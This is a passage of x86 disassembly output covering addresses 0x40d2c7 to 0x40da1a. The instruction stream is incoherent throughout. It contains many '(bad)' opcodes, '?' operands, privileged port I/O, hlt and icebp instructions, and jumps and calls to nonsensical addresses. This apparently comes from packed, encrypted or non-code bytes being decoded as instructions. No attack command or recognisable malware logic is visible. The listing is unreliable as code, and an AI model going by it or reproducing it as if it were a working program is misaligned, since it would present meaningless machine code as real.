  40d2c7:	or     DWORD PTR [ebx-0x22],ecx
  40d2ca:	pop    eax
  40d2cb:	xchg   ebp,eax
  40d2cc:	test   al,0xdb
  40d2ce:	push   ebx
  40d2cf:	fdiv   QWORD PTR [ecx*8+0x388c3a05]
  40d2d6:	scas   al,BYTE PTR es:[edi]
  40d2d7:	fisttp WORD PTR [ebx+0x77]
  40d2da:	std    
  40d2db:	pop    esi
  40d2dc:	mov    esp,0xe123767
  40d2e1:	popa   
  40d2e2:	repnz inc esi
  40d2e4:	add    BYTE PTR [ebx-0x45],0x7f
  40d2e8:	neg    esi
  40d2ea:	mov    eax,ds:0x751e0c20
  40d2ef:	sub    bl,dh
  40d2f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2f2:	mov    bh,0x7f
  40d2f4:	dec    edx
  40d2f5:	add    BYTE PTR [edx-0xaedeee2],bl
  40d2fb:	mov    esi,esp
  40d2fd:	inc    edx
  40d2fe:	leave  
  40d2ff:	push   edi
  40d300:	call   0x876244e3
  40d305:	add    BYTE PTR [edi+0x3a],cl
  40d308:	das    
  40d309:	in     al,0xe2
  40d30b:	mov    dl,0x7c
  40d30d:	cdq    
  40d30e:	inc    edx
  40d30f:	or     eax,0x6f58a152
  40d314:	hlt    
  40d315:	sti    
  40d316:	enter  0x6b37,0x99
  40d31a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d31b:	sbb    al,0x92
  40d31d:	aaa    
  40d31e:	in     eax,dx
  40d31f:	cs jl  0x40d2de
  40d322:	xor    DWORD PTR [ecx],ebp
  40d324:	les    edi,FWORD PTR es:[edx]
  40d327:	mov    esi,0x8887a882
  40d32c:	stos   DWORD PTR es:[edi],eax
  40d32d:	(bad)  
  40d32e:	sbb    cl,BYTE PTR [edi+0x36cc3375]
  40d334:	jmp    0xfee52298
  40d339:	(bad)  
  40d33a:	xchg   ebp,eax
  40d33b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d33c:	jo     0x40d2db
  40d33e:	sbb    BYTE PTR [edi+0x51],cl
  40d341:	outs   dx,DWORD PTR ds:[esi]
  40d342:	or     DWORD PTR [edi-0x50],ecx
  40d345:	fisttp QWORD PTR [edi-0x50]
  40d348:	sbb    al,BYTE PTR [ecx+0x64799cc]
  40d34e:	dec    ebp
  40d34f:	or     esp,DWORD PTR [esp+ebp*4+0x65]
  40d353:	in     eax,dx
  40d354:	bnd call 0xf835f1e
  40d35a:	sub    al,0x6c
  40d35c:	jnp    0x40d324
  40d35e:	mov    WORD PTR [esi+0x76],gs
  40d361:	xchg   edi,eax
  40d362:	loope  0x40d2f5
  40d364:	lods   al,BYTE PTR ds:[esi]
  40d365:	shr    DWORD PTR [ebx+0x67ccadbb],cl
  40d36b:	clc    
  40d36c:	lds    ebp,FWORD PTR [ecx+0x10]
  40d36f:	in     al,dx
  40d370:	jp     0x40d388
  40d372:	popa   
  40d373:	pusha  
  40d374:	popf   
  40d375:	jb     0x40d3bc
  40d377:	cmp    BYTE PTR [edi+0x5c],ch
  40d37a:	popf   
  40d37b:	push   ecx
  40d37c:	jmp    0x40d34c
  40d37e:	mov    cl,0x49
  40d380:	iret   
  40d381:	push   ecx
  40d382:	lock push edi
  40d384:	pusha  
  40d385:	mov    bl,0x3e
  40d387:	aaa    
  40d388:	adc    BYTE PTR [edi-0x56],0xf2
  40d38c:	jecxz  0x40d39a
  40d38e:	sbb    eax,0x84e00ea8
  40d393:	in     eax,0xc9
  40d395:	pusha  
  40d396:	ins    BYTE PTR es:[edi],dx
  40d397:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d398:	or     eax,DWORD PTR [esi-0x73aa1f90]
  40d39e:	lahf   
  40d39f:	nop
  40d3a0:	xchg   ebp,eax
  40d3a1:	and    bl,cl
  40d3a3:	mov    edi,DWORD PTR [ebp-0xba8d26c]
  40d3a9:	or     eax,0x929d94d9
  40d3ae:	mov    eax,ds:0x39a3ae2f
  40d3b3:	retf   0xfe7a
  40d3b6:	jbe    0x40d3c4
  40d3b8:	call   0x51047567
  40d3bd:	sub    cl,BYTE PTR [ecx+0x70c720c6]
  40d3c3:	(bad)  
  40d3c4:	push   esp
  40d3c5:	xchg   esp,eax
  40d3c6:	jmp    0x40d387
  40d3c8:	inc    esp
  40d3c9:	data16 xor dl,BYTE PTR [esi-0x63]
  40d3cd:	or     eax,0xbbcda885
  40d3d2:	mov    ebp,0xf1067369
  40d3d7:	lahf   
  40d3d8:	cs adc esp,DWORD PTR gs:[ebx-0x71]
  40d3dd:	ror    ebp,cl
  40d3df:	lock jg 0x40d38a
  40d3e2:	arpl   WORD PTR [ebp-0x1a776b2b],di
  40d3e8:	or     cl,ah
  40d3ea:	push   ds
  40d3eb:	fst    QWORD PTR [eax-0x3d510bf7]
  40d3f1:	jecxz  0x40d403
  40d3f3:	imul   DWORD PTR [ebp+0x5bab13f7]
  40d3f9:	sbb    ch,dh
  40d3fb:	add    eax,0xf3cea4ea
  40d400:	sub    ebx,ebx
  40d402:	mov    bl,0xe7
  40d404:	pop    ds
  40d405:	neg    DWORD PTR [esi+0x47]
  40d408:	sub    al,0xf8
  40d40a:	inc    eax
  40d40b:	push   ds
  40d40c:	push   ebp
  40d40d:	es (bad) 
  40d40f:	out    dx,al
  40d410:	fcmovnb st,st(3)
  40d412:	ret    
  40d413:	adc    eax,0x33ce1513
  40d418:	mov    ds:0x91c74b04,al
  40d41d:	jno    0x40d3b7
  40d41f:	dec    ebp
  40d420:	pop    eax
  40d421:	js     0x40d3d9
  40d423:	rcl    DWORD PTR [edx-0x7d],cl
  40d426:	or     bh,BYTE PTR ds:0xc88c34d3
  40d42c:	or     eax,0xe419c509
  40d431:	aad    0xe
  40d433:	and    al,0xd0
  40d435:	aad    0xcb
  40d437:	and    BYTE PTR [esi+0x3e],bl
  40d43a:	or     al,0xed
  40d43c:	add    eax,0xb02704d5
  40d441:	icebp  
  40d442:	pop    ecx
  40d443:	and    DWORD PTR ds:0x4baeb6fd,edi
  40d449:	loop   0x40d46c
  40d44b:	into   
  40d44c:	aas    
  40d44d:	aas    
  40d44e:	rol    ecx,0x68
  40d451:	jecxz  0x40d472
  40d453:	out    0x39,al
  40d455:	clc    
  40d456:	out    dx,eax
  40d457:	adc    bh,BYTE PTR [ebp-0x49579bf9]
  40d45d:	je     0x40d426
  40d45f:	ror    bl,cl
  40d461:	adc    eax,0x669a87b7
  40d466:	and    al,0x18
  40d468:	retf   0x6501
  40d46b:	mov    dl,BYTE PTR [edi]
  40d46d:	clc    
  40d46e:	aas    
  40d46f:	dec    edx
  40d470:	and    cl,cl
  40d472:	lea    eax,[ecx-0x12]
  40d475:	pop    ebp
  40d476:	or     bh,ah
  40d478:	push   ebx
  40d479:	dec    ebp
  40d47a:	or     esi,edx
  40d47c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d47d:	mov    BYTE PTR [ebx],bh
  40d47f:	sahf   
  40d480:	shl    BYTE PTR [eax+edi*2+0x2a],0x6b
  40d485:	sbb    al,0x49
  40d487:	or     BYTE PTR [esi+ebx*2+0xce9284b],dl
  40d48e:	pop    es
  40d48f:	push   esp
  40d490:	rcl    dh,0xf7
  40d493:	outs   dx,DWORD PTR ds:[esi]
  40d494:	rol    BYTE PTR [eax+eiz*8-0x53b5d0d7],1
  40d49b:	pop    eax
  40d49c:	sbb    DWORD PTR [edx+0x50],edx
  40d49f:	retf   0x9b41
  40d4a2:	or     DWORD PTR [ecx+0x301f2057],esp
  40d4a8:	scas   al,BYTE PTR es:[edi]
  40d4a9:	xor    eax,0xbe261dc7
  40d4ae:	sbb    BYTE PTR [edx-0x1f25453a],bl
  40d4b4:	add    al,0xd
  40d4b6:	xchg   esp,eax
  40d4b7:	jp     0x40d4fe
  40d4b9:	push   edi
  40d4ba:	(bad)  
  40d4bb:	adc    BYTE PTR [eax],ch
  40d4bd:	lods   al,BYTE PTR ds:[esi]
  40d4be:	adc    dl,0xdd
  40d4c1:	sub    eax,DWORD PTR ds:0x3344b620
  40d4c7:	mov    dh,0xbf
  40d4c9:	adc    BYTE PTR [esi],0xf0
  40d4cc:	and    BYTE PTR [ebx+edx*1],cl
  40d4cf:	scas   eax,DWORD PTR es:[edi]
  40d4d0:	scas   al,BYTE PTR es:[edi]
  40d4d1:	jo     0x40d4b0
  40d4d3:	mov    dl,0x18
  40d4d5:	push   0x266b18bf
  40d4da:	stos   BYTE PTR es:[edi],al
  40d4db:	pusha  
  40d4dc:	std    
  40d4dd:	xchg   edx,eax
  40d4de:	aam    0x3e
  40d4e0:	fsub   QWORD PTR [ecx-0x25ec6f36]
  40d4e6:	retf   0xa21c
  40d4e9:	in     al,dx
  40d4ea:	ins    DWORD PTR es:[edi],dx
  40d4eb:	and    ebx,DWORD PTR [ebx-0x7816a656]
  40d4f1:	mov    al,0x79
  40d4f3:	in     al,dx
  40d4f4:	aaa    
  40d4f5:	adc    al,0x1b
  40d4f7:	xor    DWORD PTR [ecx+ecx*4],esi
  40d4fa:	jmp    0x40d4b2
  40d4fc:	imul   ebp,DWORD PTR [eax],0xffffffe8
  40d4ff:	hlt    
  40d500:	add    DWORD PTR es:[edi-0x7c],edx
  40d504:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d505:	add    eax,0x1066ddac
  40d50a:	mov    es,WORD PTR [esi+0x24]
  40d50d:	mov    al,0x1f
  40d50f:	pop    ss
  40d510:	loop   0x40d4fe
  40d512:	ins    BYTE PTR es:[edi],dx
  40d513:	mov    ah,0x6d
  40d515:	pop    edi
  40d516:	dec    esp
  40d517:	out    0x20,eax
  40d519:	mov    eax,0xfbee5864
  40d51e:	gs faddp st(4),st
  40d521:	hlt    
  40d522:	sahf   
  40d523:	jae    0x40d532
  40d525:	repnz sub al,0x69
  40d528:	inc    edi
  40d529:	push   0xffffffdb
  40d52b:	inc    esp
  40d52c:	rcr    BYTE PTR [edx-0x4ee194de],cl
  40d532:	push   ds
  40d533:	retf   
  40d534:	mov    ds,WORD PTR fs:[ebx-0x13]
  40d538:	jae    0x40d53b
  40d53a:	push   ebp
  40d53b:	xchg   esp,eax
  40d53c:	push   esi
  40d53d:	dec    esi
  40d53e:	aam    0x8a
  40d540:	mov    ebx,0xda83a290
  40d545:	mov    dl,0xa4
  40d547:	test   DWORD PTR [ebp-0x222df357],ecx
  40d54d:	popa   
  40d54e:	push   es
  40d54f:	repz adc eax,DWORD PTR [ecx+0x9]
  40d553:	inc    edi
  40d554:	or     BYTE PTR [edi-0x91471cb],bl
  40d55a:	xchg   ecx,eax
  40d55b:	mov    edi,0x3f132af2
  40d560:	xchg   edi,esp
  40d562:	xchg   esp,eax
  40d563:	or     ebx,ebx
  40d565:	dec    esp
  40d566:	mov    cl,0x9f
  40d568:	sbb    BYTE PTR [edx-0x633033d4],0xfd
  40d56f:	(bad)
  40d573:	imul   esp,DWORD PTR [edi],0x9cc5ca19
  40d579:	aaa    
  40d57a:	aas    
  40d57b:	(bad)  
  40d57d:	in     al,0xd7
  40d57f:	or     esi,esi
  40d581:	adc    DWORD PTR [edi-0x31fb8c46],ebp
  40d587:	addr16 clc 
  40d589:	dec    esp
  40d58a:	mov    BYTE PTR [edi-0x4c],ch
  40d58d:	sti    
  40d58e:	fdiv   DWORD PTR [ecx-0x2b]
  40d591:	stc    
  40d592:	xor    cl,BYTE PTR [edx]
  40d594:	mov    fs,WORD PTR [ebp-0x5a]
  40d597:	sub    BYTE PTR [ebp+0x27dc28d3],dl
  40d59d:	and    BYTE PTR [ebp+0x38],dl
  40d5a0:	stc    
  40d5a1:	inc    esp
  40d5a2:	mov    ecx,0xf2ec0f1
  40d5a7:	push   ss
  40d5a8:	inc    ebx
  40d5a9:	ja     0x40d5de
  40d5ab:	loope  0x40d548
  40d5ad:	or     BYTE PTR [ebx+0x55],bl
  40d5b0:	adc    al,0x89
  40d5b2:	stos   DWORD PTR es:[edi],eax
  40d5b3:	lock test ah,ch
  40d5b6:	lods   eax,DWORD PTR ds:[esi]
  40d5b7:	test   eax,0xd577714f
  40d5bc:	or     bl,dl
  40d5be:	fdiv   QWORD PTR [edi-0x15]
  40d5c1:	ret    0x88f1
  40d5c4:	mov    ecx,DWORD PTR [ebx+0x38be9da5]
  40d5ca:	push   0xc12edfa3
  40d5cf:	add    DWORD PTR [ecx+0x76],ebp
  40d5d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5d3:	pop    ebp
  40d5d4:	ins    DWORD PTR es:[edi],dx
  40d5d5:	inc    ecx
  40d5d6:	pop    es
  40d5d7:	call   0xc7c5:0x8d375263
  40d5de:	mov    ebx,0x5c78945a
  40d5e3:	aad    0xd4
  40d5e5:	sti    
  40d5e6:	fwait
  40d5e7:	gs push ebp
  40d5e9:	(bad)  
  40d5ea:	(bad)  
  40d5eb:	leave  
  40d5ec:	xor    BYTE PTR [ebx+eax*2-0x6c3ca53d],ch
  40d5f3:	test   eax,0x36cd6b25
  40d5f8:	fnstcw WORD PTR [ebx+0x4d506fe5]
  40d5fe:	outs   dx,BYTE PTR ds:[esi]
  40d5ff:	sahf   
  40d600:	cmp    al,0x61
  40d602:	push   0xfffffffc
  40d604:	ret    0xdded
  40d607:	push   0x51763f37
  40d60c:	xor    al,0x51
  40d60e:	xchg   ebx,eax
  40d60f:	xchg   esp,eax
  40d610:	xor    bl,al
  40d612:	inc    edx
  40d613:	in     al,0x56
  40d615:	ja     0x40d5bb
  40d617:	stos   BYTE PTR es:[edi],al
  40d618:	(bad)  
  40d61a:	test   esi,edx
  40d61c:	cmp    edi,eax
  40d61e:	push   eax
  40d61f:	inc    DWORD PTR [esi-0x2c54d4a4]
  40d625:	pushf  
  40d626:	fisub  DWORD PTR [edx+ebx*4-0x251e0a43]
  40d62d:	add    BYTE PTR [eax-0x6c],ch
  40d630:	and    eax,0x7f3c9415
  40d635:	mov    BYTE PTR [eax-0x10],dl
  40d638:	loopne 0x40d5e6
  40d63a:	add    al,0xd0
  40d63c:	das    
  40d63d:	je     0x40d659
  40d63f:	inc    edx
  40d640:	or     al,0x24
  40d642:	icebp  
  40d643:	or     eax,DWORD PTR [ebx]
  40d645:	loopne 0x40d665
  40d647:	sub    DWORD PTR [ebx],ecx
  40d649:	dec    esp
  40d64a:	lds    eax,FWORD PTR [eax+eiz*4-0x462956ba]
  40d651:	(bad)  
  40d652:	fnsave [ebx+0x7a]
  40d655:	jecxz  0x40d6b9
  40d657:	(bad)  
  40d658:	dec    bl
  40d65a:	addr16 sbb edx,edx
  40d65d:	push   0x20
  40d65f:	mov    edx,0xe6f5d498
  40d664:	mov    ebp,0x1a45c8d2
  40d669:	mov    al,ds:0x3e44a587
  40d66e:	(bad)
  40d673:	clc    
  40d674:	out    dx,eax
  40d675:	mov    al,ds:0x3fbdd74f
  40d67a:	xchg   BYTE PTR [esi+0x38f5d90b],bl
  40d680:	push   cs
  40d681:	cmp    BYTE PTR [eax-0x4d],dh
  40d684:	cmp    esp,DWORD PTR [ecx]
  40d686:	popa   
  40d687:	push   cs
  40d688:	das    
  40d689:	imul   ebp,DWORD PTR [esp+eiz*2+0x7e],0x5ecf843
  40d691:	xlat   BYTE PTR ds:[ebx]
  40d692:	leave  
  40d693:	retf   
  40d694:	pop    esp
  40d695:	(bad)  
  40d696:	mov    al,ds:0x3331cbe1
  40d69b:	sub    eax,0x71e4bff4
  40d6a0:	mov    ecx,0x2d3ccb83
  40d6a5:	add    esi,DWORD PTR [ebx-0x6250e0ab]
  40d6ab:	sar    WORD PTR [esi+0x4a],cl
  40d6af:	hlt    
  40d6b0:	clc    
  40d6b1:	jle    0x40d692
  40d6b3:	shr    DWORD PTR [eax],1
  40d6b5:	cdq    
  40d6b6:	push   esi
  40d6b7:	jp     0x40d70f
  40d6b9:	test   eax,0x6083e21e
  40d6be:	pop    ebp
  40d6bf:	and    esi,esp
  40d6c1:	xlat   BYTE PTR ds:[ebx]
  40d6c2:	iret   
  40d6c3:	xor    cl,bl
  40d6c5:	lods   al,BYTE PTR ds:[esi]
  40d6c6:	and    dl,ch
  40d6c8:	test   DWORD PTR ss:[eax+0x52],0x153da8a2
  40d6d0:	or     al,0x9e
  40d6d2:	add    dl,BYTE PTR [esp+ebp*4+0xe]
  40d6d6:	pop    ds
  40d6d7:	das    
  40d6d8:	adc    BYTE PTR [esi+0x3ecbfcae],dh
  40d6de:	cmp    al,0x13
  40d6e0:	ret    0x59bf
  40d6e3:	icebp  
  40d6e4:	test   ah,ah
  40d6e6:	mov    WORD PTR [ebp+0x5d],ds
  40d6e9:	mov    dh,0x45
  40d6eb:	cli    
  40d6ec:	adc    eax,0x424678b6
  40d6f1:	push   ebp
  40d6f2:	clc    
  40d6f3:	sub    BYTE PTR [ebx],dl
  40d6f5:	inc    esi
  40d6f6:	push   cs
  40d6f7:	mov    DWORD PTR [ebx+0x74d7bcd6],0x484ef514
  40d701:	mov    ecx,0xcf83c5ba
  40d706:	mov    ch,0x2e
  40d708:	repnz pop ebp
  40d70a:	xchg   ah,ah
  40d70c:	iret   
  40d70d:	fwait
  40d70e:	sub    ebx,DWORD PTR [ebp+0x79b15b8]
  40d714:	loop   0x40d6c3
  40d716:	inc    edx
  40d717:	cdq    
  40d718:	xor    al,al
  40d71a:	es xor eax,0x60d8ae2e
  40d720:	adc    eax,0x8c2c44fc
  40d725:	jno    0x40d6bb
  40d727:	add    eax,0x3b61bff9
  40d72c:	out    0xa2,eax
  40d72e:	test   eax,0x8a7241fd
  40d733:	pop    ss
  40d734:	fimul  WORD PTR cs:[ebx-0x5000c470]
  40d73b:	or     al,0xb2
  40d73d:	cmp    DWORD PTR [ebp-0x27],edx
  40d740:	js     0x40d706
  40d742:	push   edi
  40d743:	js     0x40d730
  40d745:	cmp    dl,dl
  40d747:	add    al,0xb2
  40d749:	mov    ch,0x2b
  40d74b:	je     0x40d736
  40d74d:	outs   dx,BYTE PTR ds:[esi]
  40d74e:	jne    0x40d714
  40d750:	fnsave [eax-0x80]
  40d753:	dec    esp
  40d754:	rol    BYTE PTR [ebp+0x4e228586],cl
  40d75a:	mov    edi,0x36ce1ee6
  40d75f:	bound  ebx,QWORD PTR [esi+ebx*8]
  40d762:	(bad)  
  40d763:	stos   BYTE PTR es:[edi],al
  40d764:	les    esi,FWORD PTR [edx]
  40d766:	(bad)  
  40d767:	mov    edi,0x23d52672
  40d76c:	add    dl,0x37
  40d76f:	xchg   edx,eax
  40d770:	ins    DWORD PTR es:[edi],dx
  40d771:	call   0x2f8b8b94
  40d776:	pop    es
  40d777:	pop    esp
  40d778:	mov    al,0x56
  40d77a:	jae    0x40d756
  40d77c:	xchg   ecx,eax
  40d77d:	cmp    DWORD PTR [ebx+0x7d],ecx
  40d780:	daa    
  40d781:	dec    BYTE PTR [esi]
  40d783:	ret    
  40d784:	push   esp
  40d785:	mov    ch,0xd4
  40d787:	mov    ah,0x47
  40d789:	mov    WORD PTR [edi+eiz*4+0x27],ss
  40d78d:	test   al,0x19
  40d78f:	xchg   dl,bl
  40d791:	and    eax,0x1d3709db
  40d796:	mov    dh,0xa
  40d798:	xchg   ebx,eax
  40d799:	es dec eax
  40d79b:	adc    eax,0xf6620861
  40d7a0:	push   ebp
  40d7a1:	iret   
  40d7a2:	aam    0x2d
  40d7a4:	fidivr WORD PTR [eax+0x5faadfd0]
  40d7aa:	inc    ecx
  40d7ab:	imul   edi,esp,0x7e571e95
  40d7b1:	jne    0x40d7c5
  40d7b3:	fild   WORD PTR [ebx]
  40d7b5:	(bad)  [edx+0x3d]
  40d7b8:	mov    ecx,DWORD PTR [ebx-0x8]
  40d7bb:	add    dh,BYTE PTR [ecx-0x4f]
  40d7be:	lods   eax,DWORD PTR ds:[esi]
  40d7bf:	gs push es
  40d7c1:	in     al,0x7c
  40d7c3:	aas    
  40d7c4:	push   0x7c
  40d7c6:	fld    QWORD PTR [edx+0xf]
  40d7c9:	int3   
  40d7ca:	sub    BYTE PTR [eax+0x1e],ah
  40d7cd:	je     0x40d7b1
  40d7cf:	jnp    0x40d780
  40d7d1:	jb     0x40d7d6
  40d7d3:	dec    ecx
  40d7d4:	popa   
  40d7d5:	outs   dx,DWORD PTR ss:[esi]
  40d7d7:	out    dx,al
  40d7d8:	xchg   esi,eax
  40d7d9:	pop    esp
  40d7da:	dec    edi
  40d7db:	iret   
  40d7dc:	add    edx,DWORD PTR [ebx]
  40d7de:	out    0x2a,eax
  40d7e0:	sahf   
  40d7e1:	loop   0x40d7d5
  40d7e3:	inc    edx
  40d7e4:	stos   BYTE PTR es:[edi],al
  40d7e5:	bound  ecx,QWORD PTR [edx+0x600f2486]
  40d7eb:	mov    ebp,0x5a767359
  40d7f0:	out    0xed,al
  40d7f2:	pop    ecx
  40d7f3:	sbb    al,0xc0
  40d7f5:	xchg   BYTE PTR [edx-0x52],ah
  40d7f8:	xchg   ebp,eax
  40d7f9:	jp     0x40d781
  40d7fb:	pushf  
  40d7fc:	pop    ebx
  40d7fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7fe:	push   ss
  40d7ff:	xchg   edx,eax
  40d800:	xchg   ecx,eax
  40d801:	dec    ecx
  40d802:	jb     0x40d801
  40d804:	sbb    ah,dh
  40d806:	xchg   esp,eax
  40d807:	dec    edi
  40d808:	sbb    al,0xff
  40d80a:	test   dl,bl
  40d80c:	imul   edx,DWORD PTR [ecx],0xffffffb8
  40d80f:	jne    0x40d862
  40d811:	push   cs
  40d812:	outs   dx,BYTE PTR ds:[esi]
  40d813:	ins    DWORD PTR es:[edi],dx
  40d814:	sbb    DWORD PTR [edx],ebx
  40d816:	or     DWORD PTR [edi-0x2935de87],ebx
  40d81c:	push   ebx
  40d81d:	jg     0x40d88a
  40d81f:	imul   ch
  40d821:	inc    esi
  40d822:	inc    eax
  40d823:	or     al,0x30
  40d825:	cmp    eax,0x9bd53094
  40d82a:	js     0x40d7e3
  40d82c:	je     0x40d872
  40d82e:	mov    WORD PTR [eax+0x6b4f1b45],?
  40d834:	xchg   edx,eax
  40d835:	test   ah,0x36
  40d838:	pusha  
  40d839:	xor    esp,0xffffff83
  40d83c:	inc    edi
  40d83d:	sti    
  40d83e:	sahf   
  40d83f:	mov    eax,ds:0xb396d1b2
  40d844:	fcomi  st,st(4)
  40d846:	xchg   edx,eax
  40d847:	ins    BYTE PTR es:[edi],dx
  40d848:	dec    ebx
  40d849:	jo     0x40d85b
  40d84b:	sbb    cl,ah
  40d84d:	xor    ah,0x6c
  40d850:	pop    eax
  40d851:	sub    edi,DWORD PTR [edx+0x1e]
  40d854:	rol    DWORD PTR [ecx],0x9a
  40d857:	jecxz  0x40d855
  40d859:	push   esi
  40d85a:	mov    esi,0xca0620b4
  40d85f:	lahf   
  40d860:	sbb    BYTE PTR [ebx+0x39799d78],dl
  40d866:	pop    ebp
  40d867:	push   ebx
  40d868:	inc    esi
  40d869:	sbb    BYTE PTR [edx-0x70ac0339],bl
  40d86f:	test   al,0xc9
  40d871:	cwde   
  40d872:	xchg   esp,eax
  40d873:	loop   0x40d887
  40d875:	out    dx,eax
  40d876:	xchg   esp,eax
  40d877:	int    0x99
  40d879:	add    ecx,esi
  40d87b:	jle    0x40d85b
  40d87d:	fst    QWORD PTR [esi]
  40d87f:	or     DWORD PTR [esp+ecx*1],edi
  40d882:	mov    dh,0x5f
  40d884:	rcl    BYTE PTR [edi+0x2b242398],cl
  40d88a:	(bad)  
  40d88b:	and    esi,eax
  40d88d:	retf   0xb474
  40d890:	inc    edx
  40d891:	mov    al,0x84
  40d893:	gs dec ebx
  40d895:	mov    ?,WORD PTR [ebx-0x56]
  40d898:	sbb    cl,BYTE PTR [ebx+0x2b]
  40d89b:	cmp    BYTE PTR [ebx-0x77],bl
  40d89e:	xlat   BYTE PTR ds:[ebx]
  40d89f:	mov    ds:0xdaa798d5,al
  40d8a4:	fdiv   QWORD PTR [esi+edx*1-0x2]
  40d8a8:	sub    al,0x45
  40d8aa:	xor    DWORD PTR [edx+0x3722d148],ebx
  40d8b0:	ins    DWORD PTR es:[edi],dx
  40d8b1:	test   DWORD PTR [eax],eax
  40d8b3:	add    eax,0x4d706469
  40d8b8:	jns    0x40d8f1
  40d8ba:	mov    eax,0x96b15dfa
  40d8bf:	push   ebx
  40d8c0:	out    0x9b,eax
  40d8c2:	xor    bl,dl
  40d8c4:	and    al,0x5a
  40d8c6:	or     DWORD PTR [edx],0x65
  40d8c9:	inc    ebx
  40d8ca:	mov    BYTE PTR [ebx],dl
  40d8cc:	sub    eax,0xd955bd82
  40d8d1:	add    dl,bl
  40d8d3:	push   ss
  40d8d4:	mov    cl,0x4b
  40d8d6:	pop    esp
  40d8d7:	mov    al,0x8c
  40d8d9:	pop    esi
  40d8da:	jbe    0x40d8a8
  40d8dc:	rol    edi,0xb9
  40d8df:	in     eax,0x8c
  40d8e1:	stos   BYTE PTR es:[edi],al
  40d8e2:	test   al,0x4c
  40d8e4:	or     eax,0xcf860e30
  40d8e9:	lea    ecx,[ebx]
  40d8eb:	dec    ebp
  40d8ec:	dec    eax
  40d8ed:	dec    ebp
  40d8ee:	sub    DWORD PTR [eax],edi
  40d8f0:	sub    al,0xc5
  40d8f3:	les    edi,FWORD PTR [ebp-0x33]
  40d8f6:	jbe    0x40d893
  40d8f8:	add    ch,BYTE PTR ds:0xf5e1ff60
  40d8fe:	cld    
  40d8ff:	pop    edi
  40d900:	stc    
  40d901:	pop    es
  40d902:	xor    DWORD PTR [edx+0x66],esp
  40d905:	popf   
  40d906:	dec    esp
  40d907:	ret    0x8855
  40d90a:	push   edx
  40d90b:	push   ebp
  40d90c:	inc    ebx
  40d90d:	repz adc ebx,DWORD PTR [esi+0x31]
  40d911:	imul   ebp,DWORD PTR [eax-0x63],0xb0e72546
  40d918:	adc    ebp,DWORD PTR [ebp+0x32ec310d]
  40d91e:	add    DWORD PTR [eax+0x1],ebp
  40d921:	test   BYTE PTR ds:0x5f52f442,0xd
  40d928:	(bad)  
  40d929:	sahf   
  40d92a:	mov    edx,0x8c7fa634
  40d92f:	mov    al,0xcd
  40d931:	out    0x1,al
  40d933:	imul   edi,ecx,0x846d1402
  40d939:	push   0x6b56b2dc
  40d93e:	push   ecx
  40d93f:	sbb    cl,bl
  40d941:	sub    al,0x58
  40d943:	jb     0x40d992
  40d945:	or     eax,0x8967d924
  40d94a:	sbb    BYTE PTR [ebx+eax*2],0x6d
  40d94e:	hlt    
  40d94f:	xchg   DWORD PTR [ebx-0x3aaeb371],edi
  40d955:	and    DWORD PTR [ebp-0x4e],eax
  40d958:	test   BYTE PTR [ebp-0x70],ah
  40d95b:	and    edx,ebp
  40d95d:	mov    eax,0x7b1d295e
  40d962:	in     eax,dx
  40d963:	and    DWORD PTR [ecx],esi
  40d965:	bound  eax,QWORD PTR [edi+ecx*8]
  40d968:	xchg   esi,eax
  40d969:	lea    si,[edx-0x6a52c04a]
  40d970:	sbb    DWORD PTR [ecx],0xf223bb37
  40d976:	std    
  40d977:	out    0x59,eax
  40d979:	aad    0x70
  40d97b:	mov    ebp,0xe3c4ce9
  40d980:	ss pop ebp
  40d982:	rcr    esp,1
  40d984:	or     al,0x21
  40d986:	ffreep st(2)
  40d988:	or     DWORD PTR [ebp+0x38],edx
  40d98b:	pusha  
  40d98c:	pusha  
  40d98d:	fnstsw WORD PTR [eax+0x4f]
  40d990:	dec    edi
  40d991:	repnz mov bl,0x1b
  40d994:	lds    edx,FWORD PTR [ecx+0x67]
  40d997:	inc    edx
  40d998:	xchg   BYTE PTR [eax+0xa225ead],dl
  40d99e:	xchg   BYTE PTR [eax-0x1],cl
  40d9a1:	stos   DWORD PTR es:[edi],eax
  40d9a2:	xchg   esi,eax
  40d9a3:	enter  0x97e7,0xf3
  40d9a7:	mov    edi,0xfdf0965c
  40d9ac:	sub    al,0x27
  40d9ae:	sbb    BYTE PTR [edx+0x4020f671],0xf
  40d9b5:	(bad)  
  40d9b6:	jmp    0x40d93d
  40d9b8:	test   dl,0xc8
  40d9bb:	daa    
  40d9bc:	push   edi
  40d9bd:	mov    dl,0x3a
  40d9bf:	jne    0x40d9ea
  40d9c1:	push   ebp
  40d9c2:	inc    ebx
  40d9c3:	gs inc ebx
  40d9c5:	popf   
  40d9c6:	xchg   ecx,eax
  40d9c7:	push   edi
  40d9c8:	enter  0x1f3b,0x2e
  40d9cc:	mov    ds:0x10404999,eax
  40d9d1:	nop
  40d9d2:	stc    
  40d9d3:	sub    al,0xbe
  40d9d5:	dec    esp
  40d9d6:	mov    al,al
  40d9d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9d9:	lds    esi,FWORD PTR ds:0x583795ed
  40d9df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9e0:	int    0xf5
  40d9e2:	sbb    dl,BYTE PTR [ebx-0x3efe9a96]
  40d9e8:	inc    edx
  40d9e9:	add    bl,cl
  40d9eb:	mov    eax,0xcad80358
  40d9f0:	aam    0x75
  40d9f2:	in     al,dx
  40d9f3:	mov    dh,0xc8
  40d9f5:	jbe    0x40da5a
  40d9f7:	push   esi
  40d9f8:	mov    dl,0x43
  40d9fa:	pop    es
  40d9fb:	push   0xffffffbb
  40d9fd:	imul   esi,DWORD PTR [ecx],0x91c1284f
  40da03:	leave  
  40da04:	pop    ebx
  40da05:	adc    eax,0x5c45374c
  40da0a:	popf   
  40da0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da0c:	test   esp,edx
  40da0e:	cmp    DWORD PTR ds:0xc59220b1,esi
  40da14:	and    esi,ebx
  40da16:	jbe    0x40d9c8
  40da18:	mov    al,BYTE PTR [eax]
  40da1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
